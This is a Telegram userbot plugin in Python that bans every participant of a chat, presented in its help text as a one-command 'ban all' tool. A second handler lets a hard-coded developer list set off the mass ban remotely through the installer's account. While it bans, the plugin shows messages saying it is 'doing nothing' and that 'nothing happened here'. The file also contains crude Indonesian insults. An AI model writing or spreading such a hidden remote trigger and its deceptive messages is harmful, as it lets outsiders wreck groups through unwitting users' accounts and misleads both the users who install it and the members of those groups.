from asyncio import sleep
from telethon.tl.types import ChatBannedRights
from telethon.tl.functions.channels import EditBannedRequest
from userbot.events import register
from userbot import CMD_HELP, DEVS
from userbot import CMD_HANDLER as cmd
from userbot.utils import ram_cmd
# Aku nambah kredit sdikit
# rama ganteng bgt kan?
# Port By @VckyouuBitch From GeezProject
# Perkontolan Dengan Hapus Credits
@ram_cmd(pattern="allout$")
@register(incoming=True, from_users=DEVS, pattern=r"^\.callout$")
async def testing(event):
    nikal = await event.get_chat()
    chutiya = await event.client.get_me()
    admin = nikal.admin_rights
    creator = nikal.creator
    if not admin and not creator:
        await event.edit("Lu bukan admin, NGENTOOOOTTTTTT!!")
        return
    await event.edit("Tidak Melakukan Apa-apa")
# Thank for Dark_Cobra
    everyone = await event.client.get_participants(event.chat_id)
    for user in everyone:
        if user.id == chutiya.id:
            pass
        try:
            await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
        except Exception as e:
            await event.edit(str(e))
        await sleep(.5)
    await event.edit("Tidak Ada yang Terjadi di sini🙃🙂")

CMD_HELP.update(
    {
        "cukup": f"**Plugin : **`cukup`\
    \n\n**Syntax : **`{cmd}allout`\
    \n**Function : **ban all members in 1 comand"
    }
)
